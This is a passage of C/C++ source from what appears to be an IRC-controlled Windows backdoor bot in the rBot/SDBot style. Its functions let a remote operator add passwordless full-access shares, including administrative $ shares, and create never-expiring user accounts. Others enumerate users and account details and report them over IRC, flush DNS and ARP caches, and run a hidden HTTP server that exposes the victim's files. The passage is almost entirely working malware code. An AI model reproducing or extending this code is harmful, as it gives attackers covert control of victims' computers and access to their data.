	fCloseServiceHandle(handle); 

	if(servicesreturned<=0)
		return FALSE;
	
	return TRUE;
}

char *Shares(int action, char *ShareName, char *SharePath)
{
	static char buffer[IRCLINE];
	NET_API_STATUS nStatus = 0;

	if (ShareName) {
		switch (action) {
		case NET_ADD:
			if(SharePath || strchr(ShareName,'$'))
				nStatus = ShareAdd(NULL,ShareName,SharePath);
			else
				nStatus = ERROR_INVALID_PARAMETER;
			break;
		case NET_DELETE:
			nStatus = ShareDel(NULL, ShareName);
			break;
		}

		if (nStatus == NERR_Success)
			sprintf(buffer,"8::[4NeT8]:: %s share: '%s'.", netcommand[action].completed, ShareName);
		else
			sprintf(buffer,"8::[4NeT8]:: %s: Error with share: '%s'. %s", netcommand[action].action, ShareName, NasError(nStatus));
	}
	else 
		sprintf(buffer,"8::[4NeT8]:: %s: No share specified.", netcommand[action].action);

	return (buffer);
}

static char *AsWideString(const char *cszANSIstring)
{
	if(cszANSIstring == NULL)
		return NULL;
	
	int nBufSize = MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, cszANSIstring, -1, NULL, 0);
	WCHAR *wideString = new WCHAR[nBufSize+1];
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, cszANSIstring, -1, wideString, nBufSize);
	
	return reinterpret_cast<char*>(wideString);
}

char *AsAnsiString(const WCHAR *cszWIDEstring)
{
	if(cszWIDEstring == NULL)
		return NULL;
	
	int nBufSize = WideCharToMultiByte(CP_ACP, WC_NO_BEST_FIT_CHARS, cszWIDEstring, -1, NULL, 0, NULL, NULL);
	static char* ansiString = new char[nBufSize+1];
	WideCharToMultiByte(CP_ACP, WC_NO_BEST_FIT_CHARS, cszWIDEstring, -1, ansiString, nBufSize, NULL, NULL);
	
	return reinterpret_cast<char*>(ansiString);
}

NET_API_STATUS ShareAdd(char *ServerName, char *ShareName, char *SharePath)
{
	SHARE_INFO_2 pBuf; // NT only
	DWORD parm_err;

	// Assign values to the SHARES_INFO_2 structure.
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	pBuf.shi2_netname = (LPWSTR)AsWideString(ShareName);
	if (strchr(ShareName, '$'))
		pBuf.shi2_type = STYPE_SPECIAL; // $c, $d, $ipc, $admin
	else
		pBuf.shi2_type = STYPE_DISKTREE; // anything else
	pBuf.shi2_remark = NULL; // No share comment
	pBuf.shi2_permissions = ACCESS_ALL;
	pBuf.shi2_max_uses = -1; // Unlimited
	pBuf.shi2_current_uses = 0;
	pBuf.shi2_path = (LPWSTR)AsWideString(SharePath);
	pBuf.shi2_passwd = NULL; // No password

	// level must be 2 for NT, otherwise it's 50 on 9x (but who cares ;)
	NET_API_STATUS nStatus = fNetShareAdd(wServerName, 2, (LPBYTE)&pBuf, &parm_err);

	return (nStatus);
}

NET_API_STATUS ShareDel(char *ServerName, char *ShareName)
{
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	LPWSTR wShareName = (LPWSTR)AsWideString(ShareName);

	NET_API_STATUS nStatus = fNetShareDel(wServerName,wShareName,0);  

	return (nStatus);
}

BOOL ListShares(SOCKET sock, char *chan, BOOL notice, char *ServerName)
{
	char buffer[IRCLINE];

	PSHARE_INFO_502 pBuf,p;
	NET_API_STATUS nStatus;
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	DWORD entriesread=0,totalread=0,resume=0;

	irc_privmsg(sock,chan,"Share name:    Resource:                Uses:  Desc:",notice);
 
	do {
		nStatus = fNetShareEnum(wServerName, 502, (LPBYTE *) &pBuf, -1, &entriesread, &totalread, &resume);

		if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA) {
			p = pBuf;
 
			for(unsigned int i=1;i <= entriesread;i++) {
	            sprintf(buffer,"%-14S %-24S %-6u %-4s",p->shi502_netname, p->shi502_path, p->shi502_current_uses, IsVSD(fIsValidSecurityDescriptor(p->shi502_security_descriptor)));
				irc_privmsg(sock,chan,buffer,notice,TRUE);

				p++;
			}

			fNetApiBufferFree(pBuf);
		} else {
			sprintf(buffer,"8::[4NeT8]:: Share list error: %s <%ld>",NasError(nStatus),nStatus);
			irc_privmsg(sock,chan,buffer,notice);
		}
	} while (nStatus == ERROR_MORE_DATA);	

	if(nStatus != ERROR_SUCCESS)
		return FALSE;
	
	return TRUE;
}

char *Users(int action, char *Username, char *Password, SOCKET sock, char *chan, BOOL notice)
{
	static char buffer[IRCLINE];
	NET_API_STATUS nStatus = 0;

	if (Username) {
		switch (action) {
		case NET_ADD:
			if(Username && Password)
				nStatus = UserAdd(NULL,Username,Password);
			else
				nStatus = ERROR_INVALID_PARAMETER;
			break;
		case NET_DELETE:
			nStatus = UserDel(NULL, Username);
			break;
		case NET_INFO:
			nStatus = UserInfo(NULL,Username,sock,chan,notice);
			break;
		default:
			break;
		}

		if (nStatus == NERR_Success)
			sprintf(buffer,"8::[4NeT8]:: %s username: '%s'.", netcommand[action].completed, Username);
		else
			sprintf(buffer,"8::[4NeT8]:: %s: Error with username: '%s'. %s", netcommand[action].action, Username, NasError(nStatus));
	}
	else 
		sprintf(buffer,"8::[4NeT8]:: %s: No username specified.", netcommand[action].action);

	return (buffer);
}

NET_API_STATUS UserAdd(char *ServerName, char *Username, char *Password)
{
	USER_INFO_1 ui;
	DWORD dwLevel = 1, dwError = 0;

	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	ui.usri1_name = (LPWSTR)AsWideString(Username);
	ui.usri1_password = (LPWSTR)AsWideString(Password);
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
	ui.usri1_script_path = NULL;

	NET_API_STATUS nStatus = fNetUserAdd(wServerName,dwLevel,(LPBYTE)&ui,&dwError);

	return (nStatus);
}

NET_API_STATUS UserDel(char *ServerName, char *Username)
{
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	LPWSTR wUsername = (LPWSTR)AsWideString(Username);

	NET_API_STATUS nStatus = fNetUserDel(wServerName,wUsername);  

	return (nStatus);
}

NET_API_STATUS UserInfo(char *ServerName, char *Username, SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], *user_priv;

	LPUSER_INFO_11 pBuf = NULL;
	DWORD dwLevel = 11;
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	LPWSTR wUsername = (LPWSTR)AsWideString(Username);
	
	NET_API_STATUS nStatus = fNetUserGetInfo(wServerName,wUsername,dwLevel,(LPBYTE *)&pBuf);

	if (nStatus == NERR_Success) {
		if (pBuf != NULL) {
			sprintf(buffer,"Account: %S",pBuf->usri11_name);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Full Name: %S",pBuf->usri11_full_name);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"User Comment: %S",pBuf->usri11_usr_comment);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Comment: %S",pBuf->usri11_comment);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			switch(pBuf->usri11_priv) {
			case USER_PRIV_GUEST: 
				user_priv = TEXT("Guest"); 
				break;
			case USER_PRIV_USER:
				user_priv = TEXT("User");
				break;
			case USER_PRIV_ADMIN: 
				user_priv = TEXT("Administrator");
				break;
			default:
				user_priv = TEXT("Unknown");
				break;
			}
			sprintf(buffer,"Privilege Level: %s",user_priv);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Auth Flags: %d",pBuf->usri11_auth_flags);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Home Directory: %S",pBuf->usri11_home_dir);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Parameters: %S",pBuf->usri11_parms);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Password Age: %d",pBuf->usri11_password_age);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Bad Password Count: %d",pBuf->usri11_bad_pw_count);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Number of Logins: %d",pBuf->usri11_num_logons);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Last Logon: %d",pBuf->usri11_last_logon);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Last Logoff: %d",pBuf->usri11_last_logoff);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Logon Server: %S",pBuf->usri11_logon_server);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Workstations: %S",pBuf->usri11_workstations);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Country Code: %d",pBuf->usri11_country_code);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"User's Language: %d",pBuf->usri11_code_page);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Max. Storage: %d",pBuf->usri11_max_storage);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Units Per Week: %d",pBuf->usri11_units_per_week);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
		}
	}
	else {
		sprintf(buffer,"8::[4NeT8]:: User info error: <%ld>",nStatus);
		irc_privmsg(sock,chan,buffer,notice);
	}

	if (pBuf != NULL)
		fNetApiBufferFree(pBuf);

	return (nStatus);
}

BOOL ListUsers(SOCKET sock, char *chan, BOOL notice, char *ServerName)
{

	char buffer[IRCLINE];

	LPUSER_INFO_0 pBuf=NULL, pTmpBuf;
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	DWORD dwLevel=0,dwPrefMaxLen=MAX_PREFERRED_LENGTH,dwEntriesRead=0,
		dwTotalEntries=0,dwResumeHandle=0,dwTotalCount=0;
	NET_API_STATUS nStatus;

	irc_privmsg(sock,chan,"Username accounts for local system:",notice);

	do {
		nStatus = fNetUserEnum(wServerName,dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,
			dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);
      
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
			if ((pTmpBuf = pBuf) != NULL) {
				for (DWORD i = 0;i < dwEntriesRead; i++) {
					assert(pTmpBuf != NULL);

					if (pTmpBuf == NULL) {
						sprintf(buffer,"8::[4NeT8]:: An access violation has occured.");
						irc_privmsg(sock,chan,buffer,notice);
						break;
					}

					sprintf(buffer,"  %S",pTmpBuf->usri0_name);
					irc_privmsg(sock,chan,buffer,notice,TRUE);

					pTmpBuf++;
					dwTotalCount++;
				}
			}
		} else {
			sprintf(buffer,"8::[4NeT8]:: User list error: %s <%ld>",NasError(nStatus),nStatus);
			irc_privmsg(sock,chan,buffer,notice);
		}

		if (pBuf != NULL) {
			fNetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	} while (nStatus == ERROR_MORE_DATA);

	if (pBuf != NULL)
		fNetApiBufferFree(pBuf);

	sprintf(buffer,"Total users found: %d.",dwTotalCount);
	irc_privmsg(sock,chan,buffer,notice);

	if(nStatus != ERROR_SUCCESS)
		return FALSE;

	return TRUE;
}

static char *NasError(NET_API_STATUS nStatus)
{
	static char retError[90];

	switch (nStatus) {
	case ERROR_ACCESS_DENIED:
		sprintf(retError,"Access denied.");
		break;
	case ERROR_INVALID_LEVEL:
		sprintf(retError,"Level parameter is invalid.");
		break;
	case ERROR_INVALID_NAME:
		sprintf(retError,"The name is invalid.");
		break;
	case ERROR_INVALID_PARAMETER:
		sprintf(retError,"Invalid parameter.");
		break;
	case ERROR_NOT_ENOUGH_MEMORY:
		sprintf(retError,"Not enough memory.");
		break;
	case ERROR_NOT_SUPPORTED:
		sprintf(retError,"This network request is not supported.");
		break;
	case ERROR_BAD_NETPATH:
		sprintf(retError,"Server name not found.");
		break;
	case NERR_NetNameNotFound:
		sprintf(retError,"Share not found.");
		break;
	case NERR_DuplicateShare:
		sprintf(retError,"Duplicate share name.");
		break;
	case NERR_RedirectedPath:
		sprintf(retError,"Invalid for redirected resource.");
		break;
	case NERR_UnknownDevDir:
		sprintf(retError,"Device or directory does not exist.");
		break;
	case NERR_InvalidComputer:
		sprintf(retError,"The computer name is invalid.");
		break;
	case NERR_NotPrimary:
		sprintf(retError,"The operation is allowed only on the primary domain controller of the domain.");
		break;
	case NERR_GroupExists:
		sprintf(retError,"The group already exists.");
		break;
	case NERR_UserExists:
		sprintf(retError,"The user account already exists.");
		break;
	case NERR_PasswordTooShort:
		sprintf(retError,"The password is shorter than required (or does not meet the password policy requirement.)");
		break;
	case NERR_UseNotFound:
		sprintf(retError,"Network connection not found.");
		break;
	case NERR_NetworkError:
		sprintf(retError,"A general failure occurred in the network hardware.");
		break;
	case NERR_NameNotFound:
	case NERR_UserNotFound:
		sprintf(retError,"The user name could not be found.");
		break;
	default:
		sprintf(retError,"An unknown error occurred.");
		break;
	}			

	return (retError);
}

char *NetSend(char *msg, SOCKET sock, char *chan, BOOL notice)
{
	static char buffer[IRCLINE];

	wchar_t wserver[MAX_PATH+4], wmsg[IRCLINE];
	mbstowcs(wmsg, msg, IRCLINE);

	char Server[MAX_PATH+4];
	DWORD szServer = sizeof(Server);
	GetComputerName(Server, &szServer);	
	mbstowcs(wserver, Server, MAX_PATH+4);
	
	NET_API_STATUS nStatus = fNetMessageBufferSend(NULL, wserver, NULL, (LPBYTE)&wmsg, wcslen(wmsg)*2);

	if(nStatus == NERR_Success)
		sprintf(buffer,"8::[4NeT8]:: Message sent successfully.");
	else
		sprintf(buffer,"8::[4NeT8]:: %s <Server: %S> <Message: %S>", NasError(nStatus), wserver, wmsg);

	return (buffer);
}
#endif

BOOL PrivateIP(const char *ip)
{	
	if (ip) {
		if (strcmp(ip, "") != 0) {
			char *token, ipbuf[32]; 	
			strncpy(ipbuf, ip, sizeof(ipbuf)); 
			if ((token=strtok(ipbuf, ".")) != NULL) { 
				int ip1 = atoi(token);
				if ((token=strtok(NULL, ".")) != NULL) {
					int ip2 = atoi(token);

					if ((ip1 == 10)									// Class A Private Network
						|| (ip1 == 172 && ip2 > 15 && ip2 < 32)	// Class B Private Network
						|| (ip1 == 192 && ip2 == 168))				// Class C Private Network
						//|| (ip1 == 90 && ip2 == 0))					// Undefined Network Range
						return TRUE;
				}
			}
		}
	}
	return FALSE; 
}

unsigned long ResolveAddress(char *szHost)
{
	unsigned long IP = finet_addr(szHost);
	if (IP==INADDR_NONE) {
		hostent *pHE = fgethostbyname(szHost);
		if (pHE == 0) 
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);	
	}

	return IP;
}

BOOL FlushDNSCache(void)
{
	BOOL bRet = FALSE;
	if (fDnsFlushResolverCache)
		bRet = fDnsFlushResolverCache();

	return (bRet);
}

BOOL FlushARPCache(void)
{
    char logbuf[LOGLINE];
    PMIB_IPNETTABLE arp = 0;
    ULONG tsize = 0;
	BOOL bRet = TRUE;
	
    DWORD result = fGetIpNetTable(NULL, &tsize, TRUE);
	switch(result) {
	case ERROR_SUCCESS:
		break;
	case ERROR_INSUFFICIENT_BUFFER:
		arp=(PMIB_IPNETTABLE)malloc(tsize);
		memset((LPVOID)arp, 0, tsize);

		if (arp != NULL) {
			if ((result = fGetIpNetTable(arp, &tsize, TRUE)) != ERROR_SUCCESS) {
				sprintf(logbuf,"8::[4NeT8]:: Error getting ARP cache: <%d>.",result);
				bRet = FALSE;
			}
		} else {
			sprintf(logbuf,"8::[4FlUsH dNs8]:: Unable to allocation ARP cache.");
			bRet = FALSE;
		}
		break;
	case ERROR_NO_DATA:
		sprintf(logbuf,"8::[4FlUsH dNs8]:: ARP cache is empty.");
		bRet = FALSE;
		break;
	case ERROR_NOT_SUPPORTED:
		sprintf(logbuf,"8::[4FlUsH dNs8]:: Not supported by this system.");
		bRet = FALSE;
		break;
	default:
		sprintf(logbuf,"8::[4FlUsH dNs8]:: Error getting ARP cache: <%d>.",result);
		bRet = FALSE;
	}

	if (bRet) {
	    for (unsigned int i = 0; i < arp->dwNumEntries; i++)
			fDeleteIpNetEntry(&arp->table[i]);
	} else
		addlog(logbuf);
	free(arp);

	return (bRet);
}

char *GetIP(SOCKET sock)
{
	static char IP[16];

	SOCKADDR sa;
	int sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	fgetsockname(sock, &sa, &sas);

	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (IP);
}

// Standard TCP/UDP checksum function.
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(USHORT);   
    }

    if (size)
        cksum += *(UCHAR*)buffer;   

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 

    return (USHORT)(~cksum); 
}

unsigned short in_cksum(unsigned short *addr,int len)
{
	register int sum = 0;
	unsigned short answer = 0;
	register unsigned short *w = addr;
	register int nleft = len;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
	sum += (sum >> 16);                     /* add carry */
	answer = ~sum;                          /* truncate to 16 bits */
	return(answer);
}

#ifndef NO_HTTPD

DWORD WINAPI HTTP_Server_Thread(LPVOID param) 
{
	HTTPD httpd = *((HTTPD *)param);
	HTTPD *httpds = (HTTPD *)param;
	httpds->info = TRUE;
	
	char sendbuf[IRCLINE], buffer[4096], rBuffer[4096], file[MAX_PATH], *file_to_send = "\0";

	int gsin_len;
    unsigned int i,r,b, max;
	unsigned long mode = 1;

	SOCKET gsock, ssock;
	SOCKADDR_IN  gsin, ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)httpd.port);
	ssin.sin_addr.s_addr = INADDR_ANY;

	if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		threads[httpd.threadnum].sock = ssock;
		if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (flisten(ssock, SOMAXCONN) != SOCKET_ERROR) {
				if (fioctlsocket(ssock,FIONBIO,&mode) != SOCKET_ERROR) {

					fd_set master, temp; 
					FD_ZERO(&master); 
					FD_ZERO(&temp);
					FD_SET(ssock, &master);
					max = ssock;

					while (1) {
						temp = master;
						if (fselect(max+1, &temp, NULL, NULL, NULL) == SOCKET_ERROR)
							break;
          
						for(i=0; i <= max; i++) {
							if (fFD_ISSET(i, &temp)) { //there is somthing to do 
								if (i == ssock) {
									//there is a new connection request
									gsin_len = sizeof(gsin);

									if ((gsock = faccept(ssock, (LPSOCKADDR)&gsin, &gsin_len)) == INVALID_SOCKET)  
										continue; 
									else {
										FD_SET(gsock, &master); // add to master set
										if (gsock > (unsigned int)max)  
											max = gsock;
									}
								} else {
    								memset(buffer,0,sizeof(buffer));
									memset(rBuffer,0,sizeof(rBuffer));
									if (frecv(i, buffer, sizeof(buffer), 0) <= 0) { //socket error
										fclosesocket(i); 
										FD_CLR(i, &master); // remove from master set
									} else {
										memset(file,0,sizeof(file));
										for (b=0,r=0; b<strlen(buffer); b++,r++) {
											rBuffer[r] = buffer[b];
											if (buffer[b] == '\n') {  //check the request....
												if (strstr(rBuffer,"GET ") != NULL && strlen(rBuffer) > 5) { //look for a GET request
													file_to_send = strtok(strstr(strstr(rBuffer,"GET ")," ")," ");
													strcpy(file,file_to_send);
												} else if (strcmp(rBuffer,"\r\n") == 0) {  //end of the request check if there is anything to send back
													FD_CLR(i, &master);
													if (file != NULL) {
														if (strlen(file)+strlen(httpd.dir) < MAX_PATH) { 
															unsigned long mode2 = 0;
															fioctlsocket(i,FIONBIO,&mode2);
															Check_Requested_File(i,httpd.dir,file,httpd.enabled,httpd.threadnum);
														} else 
															fclosesocket(i);
													} else 
														fclosesocket(i);
													break;
												}
												memset(rBuffer,0,sizeof(rBuffer));
												r=-1;
											}
										}
									}
								}
							}
                		} 
        			}
				}
			}
		}
	}
	
	sprintf(sendbuf, "8::[4HtTpD8]:: Error: server failed, returned: <%d>.", fWSAGetLastError());
	if (!httpd.silent) irc_privmsg(httpd.sock, httpd.chan, sendbuf, httpd.notice);
	addlog(sendbuf);

	fclosesocket(ssock);
	clearthread(httpd.threadnum);

	ExitThread(0);
}

DWORD WINAPI HTTP_Header(LPVOID param)
{
	HTTPD httpd = *((HTTPD *)param);
	HTTPD *httpds = (HTTPD *)param;
	httpds->info = TRUE;

	char tFile[MAX_PATH], nFile[MAX_PATH], content[50], buffer[4096], date[70], time[30];

	sprintf(tFile,httpd.file); 
	sprintf(nFile,httpd.path); 

	if (httpd.type) 
		sprintf(content,"text/html");
	else 
		sprintf(content,"application/octet-stream");

	GetDateFormat(0x409,0,0,"ddd, dd MMM yyyy",date,70);
	GetTimeFormat(0x409,0,0,"HH:mm:ss",time,30);

	if (httpd.length == -1)
		sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: myBot\r\nCache-Control: no-cache,no-store,max-age=0\r\npragma: no-cache\r\nContent-Type: %s\r\nAccept-Ranges: bytes\r\nDate: %s %s GMT\r\nLast-Modified: %s %s GMT\r\nExpires: %s %s GMT\r\nConnection: close\r\n\r\n",content,date,time,date,time,date,time);
	else
		sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: myBot\r\nCache-Control: no-cache,no-store,max-age=0\r\npragma: no-cache\r\nContent-Type: %s\r\nContent-Length: %i\r\nAccept-Ranges: bytes\r\nDate: %s %s GMT\r\nLast-Modified: %s %s GMT\r\nExpires: %s %s GMT\r\nConnection: close\r\n\r\n",content,httpd.length,date,time,date,time,date,time);
	fsend(httpd.sock,buffer,strlen(buffer),0);

	if (httpd.type == FALSE) 
		HTTP_Send_File(httpd.sock,tFile);
	else 
		GetFiles(tFile,httpd.sock,NULL,nFile); 

	fclosesocket(httpd.sock);
	clearthread(httpd.threadnum);

	ExitThread(0);
}

int Check_Requested_File(SOCKET sock, char *dir ,char *rFile, BOOL dirinfo, int threadnum)
{
	char buffer[IRCLINE], file[MAX_PATH], nFile[MAX_PATH], tFile[MAX_PATH];

	DWORD c,d, id;
	BOOL directory = FALSE;

	memset(nFile,0,sizeof(nFile));
	if (rFile[0] != 47) 
		sprintf(file,"\\%s",rFile);
	else {
		rFile[0] = 92;
		sprintf(file,"%s",rFile);
	}
	for (c=0,d=0; c<strlen(file); c++,d++) {
		if ((((c+2 < strlen(file) && file[c] == 37 && file[c+1] == 50 && file[c+2] == 48)))) {
			nFile[d] = 32;
			c=c+2;
		} else 
			nFile[d] = ((file[c] == 47)?(92):(file[c]));
	}
	sprintf(tFile,"%s%s",dir,nFile);
	strtok(tFile,"\n");

	switch(GetFileAttributes(tFile)) {
	case FILE_ATTRIBUTE_DIRECTORY:
		directory = TRUE;
		break;
	case 0xFFFFFFFF:
		fclosesocket(sock);
		return 0;
	}

	if (nFile[d-1] == 92) 
		directory = TRUE;

	HTTPD httpd;
	httpd.sock = sock;
	httpd.info = FALSE;

	if (directory) {
		if (dirinfo) {
			strcat(tFile,"*");
			sprintf(httpd.file,tFile);

			File_To_HTML(nFile);
			sprintf(httpd.path,nFile);

			httpd.type = TRUE;
			httpd.length = -1;
		} else {
			fclosesocket(sock);

			return 0;
		}
	} else {
		HANDLE testfile = CreateFile(tFile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
      	if (testfile != INVALID_HANDLE_VALUE) {
			sprintf(httpd.file,tFile);

			httpd.type = FALSE;
			httpd.length = GetFileSize(testfile,NULL);

			CloseHandle(testfile);
		}
	}
	
	sprintf(buffer,"8::[4HtTpD8]:: Worker thread of server thread: %d.", threadnum);
	httpd.threadnum = addthread(buffer,HTTP_THREAD,NULL);
	threads[httpd.threadnum].parent = threadnum;
	if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Header, (LPVOID)&httpd, 0, &id)) {
		while (httpd.info == FALSE) 
			Sleep(5);
	} else {
		fclosesocket(sock);
		sprintf(buffer,"8::[4HtTpD8]:: Failed to start worker thread, error: <%d>.", GetLastError());
		addlog(buffer);
	}

	return 0;
}

int GetFiles(char *current, SOCKET sock, char *chan, char *URL)
{
	FILETIME ftBuf;
	SYSTEMTIME stBuf;
	WIN32_FIND_DATA WFD;
		
	char sendbuf[IRCLINE],parent[MAX_PATH],tmpDate[40],tmpDir[MAX_PATH+2];
	int count=0, count2=0;
	unsigned int COL1=230, COL2=150, COL3=60, FILESIZE=30;
  
	memset(parent,0,sizeof(parent));
	strtok(current,"\n");
	if (chan) 
		_snprintf(sendbuf,sizeof(sendbuf),"PRIVMSG %s :Searching for: %s\r\n",chan,current);
	else 
		if (URL) {
			current[(strlen(current)-1)]=0;

			_snprintf(sendbuf,sizeof(sendbuf),"<HTML>\r\n<HEAD>\r\n<TITLE>Index of %s</TITLE>\r\n</HEAD>\r\n<BODY>\r\n", 
				current);
			fsend(sock,sendbuf,strlen(sendbuf),0);

			_snprintf(sendbuf,sizeof(sendbuf),"<H1>Index of %s</H1>\r\n<TABLE BORDER=\"0\">\r\n", 
				current);
			fsend(sock,sendbuf,strlen(sendbuf),0);

			current[(strlen(current))]='*';

			_snprintf(sendbuf,sizeof(sendbuf),"<TR>\r\n<TD WIDTH=\"%d\"><CODE>Name</CODE></TD>\r\n<TD WIDTH=\"%d\"><CODE>Last Modified</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>Size</CODE></TD>\r\n</TR>\r\n", 
				COL1, COL2, COL3);
			fsend(sock,sendbuf,strlen(sendbuf),0);

			_snprintf(sendbuf,sizeof(sendbuf),"<TR>\r\n<TD COLSPAN=\"3\"><HR></TD>\r\n</TR>\r\n");
		} else 
			_snprintf(sendbuf,sizeof(sendbuf),"Searching for: %s\r\n",current);

	fsend(sock,sendbuf,strlen(sendbuf),0);
	if (URL && strlen(URL) > 2) {
		unsigned int c;

		for (c=strlen(URL)-3; c!=0; c--)
			if (URL[c] == 47) 
				break;
		strncpy(parent,URL,c+1);

		_snprintf(sendbuf,sizeof(sendbuf),"<TR>\r\n<TD COLSPAN=\"3\"><A HREF=\"%s\"><CODE>Parent Directory</CODE></A></TD>\r\n</TR>\r\n",parent);
		fsend(sock,sendbuf,strlen(sendbuf),0);
	}

	HANDLE Hnd = FindFirstFile(current, &WFD);
	while (FindNextFile(Hnd, &WFD)) {
		if ((WFD.dwFileAttributes) &&  (strcmp(WFD.cFileName, "..") && strcmp(WFD.cFileName, "."))) {
			FileTimeToLocalFileTime(&WFD.ftLastWriteTime, &ftBuf);
			FileTimeToSystemTime(&ftBuf, &stBuf);
			sprintf(tmpDate, "%2.2d/%2.2d/%4d  %2.2d:%2.2d %s",
				stBuf.wMonth, stBuf.wDay, stBuf.wYear, HOUR(stBuf.wHour), stBuf.wMinute, AMPM(stBuf.wHour));

			if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				count2++;
				if (chan) { 
					_snprintf(tmpDir,sizeof(tmpDir),"<%s>",WFD.cFileName);
					_snprintf(sendbuf,sizeof(sendbuf),"PRIVMSG %s :%-31s  %-21s\n",chan,tmpDir, tmpDate);
				} else 
					if (URL) {
						_snprintf(sendbuf,(sizeof(sendbuf)-1),"<TR>\r\n<TD WIDTH=\"%d\"><A HREF=\"",COL1);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"%s%s/",URL,WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						if(strlen(WFD.cFileName)>FILESIZE)
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%.29s&gt;/</CODE></A>",WFD.cFileName);
						else
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%s/</CODE></A>",WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"</TD>\r\n<TD WIDTH=\"%d\"><CODE>%s</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>-</CODE></TD>\r\n</TR>\r\n",
							COL2,tmpDate,COL3);
					} else {
						_snprintf(tmpDir,sizeof(tmpDir),"<%s>",WFD.cFileName);
						_snprintf(sendbuf,sizeof(sendbuf),"%-31s  %-21s\r\n",tmpDir,tmpDate);
					}
			} else {
				count++;
				if (chan) 
					_snprintf(sendbuf,sizeof(sendbuf),"PRIVMSG %s :%-31s  %-21s (%s bytes)\n",chan,WFD.cFileName,tmpDate,commaI64(WFD.nFileSizeLow));
				else 
					if (URL) {
						_snprintf(sendbuf,(sizeof(sendbuf)-1),"<TR>\r\n<TD WIDTH=\"%d\"><A HREF=\"",COL1);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"%s%s",URL,WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						if(strlen(WFD.cFileName)>(FILESIZE+1))
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%.30s&gt;</CODE></A>",WFD.cFileName);
						else
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%s</CODE></A>",WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

